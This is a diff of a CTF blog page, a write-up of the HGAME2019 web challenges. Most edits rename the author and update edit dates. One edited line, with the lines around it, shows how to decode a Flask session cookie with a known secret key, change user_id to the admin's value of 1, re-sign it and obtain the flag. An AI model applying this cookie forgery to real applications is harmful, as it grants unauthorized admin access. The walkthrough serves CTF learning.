@@ -111,7 +111,7 @@
 <meta property="og:image" content="https://i.loli.net/2019/02/26/5c752b920389a.png">
 <meta property="og:image" content="https://i.loli.net/2019/02/27/5c75e272afb23.png">
 <meta property="og:image" content="https://i.loli.net/2019/02/27/5c75f88d0fb45.png">
-<meta property="og:updated_time" content="2019-03-02T08:06:19.532Z">
+<meta property="og:updated_time" content="2019-03-17T13:09:45.519Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="HGAME2019-Web-Week3&amp;4">
 <meta name="twitter:description" content="week-3">
@@ -359,7 +359,7 @@
     <link itemprop="mainEntityOfPage" href="http://chaosec.top/2019/03/02/hgame2019b/"/>
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="新城瑞雪"/>
+      <meta itemprop="name" content="Aesm1p"/>
       <meta itemprop="description" content="相逢意气为君饮"/>
       <meta itemprop="image" content="/images/avatar.jpg"/>
     </span>
@@ -399,12 +399,24 @@
                 
               
 
-              <time title="Created: 2019-03-02 15:55:12 / Modified: 16:06:19" itemprop="dateCreated datePublished" datetime="2019-03-02T15:55:12+08:00">2019-03-02</time>
+              <time title="Created: 2019-03-02 15:55:12" itemprop="dateCreated datePublished" datetime="2019-03-02T15:55:12+08:00">2019-03-02</time>
             
 
             
               
 
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2019-03-17 21:09:45" itemprop="dateModified" datetime="2019-03-17T21:09:45+08:00">2019-03-17</time>
               
             
           </span>
@@ -528,7 +540,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python session.py decode -c .eJwlj0FqQzEMBe_idRaSLMl2LvORZYmGQAv_J6vSu8fQ1ayGee-3HHnG9VXur_Mdt3I8VrkXEETAdKvkc1EbK5fG0D4oXKR3DND0qSbUGy1gHwTeONI8RxCLVOWuWmU2iC27qzNrwuSKCpDTbCipEfQxyY3Fos2-nGKWW_HrzOP184zvvUexCUtm3wzlXRAbKQwzrCOtMJJel2zvfcX5fwIRy98HJ4Y_iA.XHUmGA.wO2v6jNOPBHknlA5tAqik2bE_hI -s 9RxdzNwq7!nOoK3*</span><br></pre></td></tr></table></figure>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;u&apos;csrf_token&apos;: u&apos;617545ff8175e64f9e5a9f540bea812dea2583d5&apos;, u&apos;_fresh&apos;: True, u&apos;user_id&apos;: u&apos;111&apos;, u&apos;_id&apos;: u&apos;051101fca32cbd279dfd6e96892ec55881e06fcb6a52872d04c920c74efacf9e245536486635b70ed6ecc6c446f0b431600fbaa9626a2089b2ca45ae7b8dc2eb&apos;&#125;</span><br></pre></td></tr></table></figure>
 <p>猜测user_id可能代表的是用户id，猜测admin的用户ID为1，修改一下id为1伪造cookie</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python session_cookie_manager.py encode -s 9Rxdz Nwq7!nOoK3* -t &#123;&apos;csrf_token&apos;:&apos;617545ff8175e64f9e5a9f540bea812dea2583d5&apos;,&apos;_fresh&apos;:True,&apos;user_id&apos;:&apos;1&apos;,&apos;_id&apos;:&apos;0 51101fca32cbd279dfd6e96892ec55881e06fcb6a52872d04c920c74efacf9e245536486635b70ed6ecc6c446f0b431600fbaa9626a208 9b2ca45ae7b8dc2eb&apos;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python session_cookie_manager.py encode -s 9RxdzNwq7!nOoK3* -t &#123;&apos;csrf_token&apos;:&apos;617545ff8175e64f9e5a9f540bea812dea2583d5&apos;,&apos;_fresh&apos;:True,&apos;user_id&apos;:&apos;1&apos;,&apos;_id&apos;:&apos;0 51101fca32cbd279dfd6e96892ec55881e06fcb6a52872d04c920c74efacf9e245536486635b70ed6ecc6c446f0b431600fbaa9626a208 9b2ca45ae7b8dc2eb&apos;&#125;</span><br></pre></td></tr></table></figure>
 <p>然后将生成的cookie覆盖原来cookie即可得到flag</p>
 <p><img src="https://i.loli.net/2019/02/26/5c752b920389a.png" alt=""></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;Qu_bu_la1_m1ng_z1_14&#125;</span><br></pre></td></tr></table></figure>
@@ -599,14 +611,14 @@
 
     
       <div id="wechat" style="display: inline-block">
-        <img id="wechat_qr" src="/images/reward-wechat.png" alt="新城瑞雪 WeChat Pay"/>
+        <img id="wechat_qr" src="/images/reward-wechat.png" alt="Aesm1p WeChat Pay"/>
         <p>WeChat Pay</p>
       </div>
     
 
     
       <div id="alipay" style="display: inline-block">
-        <img id="alipay_qr" src="/images/reward-alipay.jpg" alt="新城瑞雪 Alipay"/>
+        <img id="alipay_qr" src="/images/reward-alipay.jpg" alt="Aesm1p Alipay"/>
         <p>Alipay</p>
       </div>
     
@@ -631,7 +643,7 @@
 
 <ul class="post-copyright">
   <li class="post-copyright-author">
-    <strong>Post author:  </strong>新城瑞雪</li>
+    <strong>Post author:  </strong>Aesm1p</li>
   <li class="post-copyright-link">
     <strong>Post link: </strong>
     
@@ -734,9 +746,9 @@
             
               <img class="site-author-image" itemprop="image"
                 src="/images/avatar.jpg"
-                alt="新城瑞雪"/>
+                alt="Aesm1p"/>
             
-              <p class="site-author-name" itemprop="name">新城瑞雪</p>
+              <p class="site-author-name" itemprop="name">Aesm1p</p>
               <p class="site-description motion-element" itemprop="description">相逢意气为君饮</p>
           </div>
 
@@ -915,7 +927,7 @@
   <span class="with-love" id="animate">
     <i class="fa fa-user"></i>
   </span>
-  <span class="author" itemprop="copyrightHolder">新城瑞雪</span>
+  <span class="author" itemprop="copyrightHolder">Aesm1p</span>
 
   
 
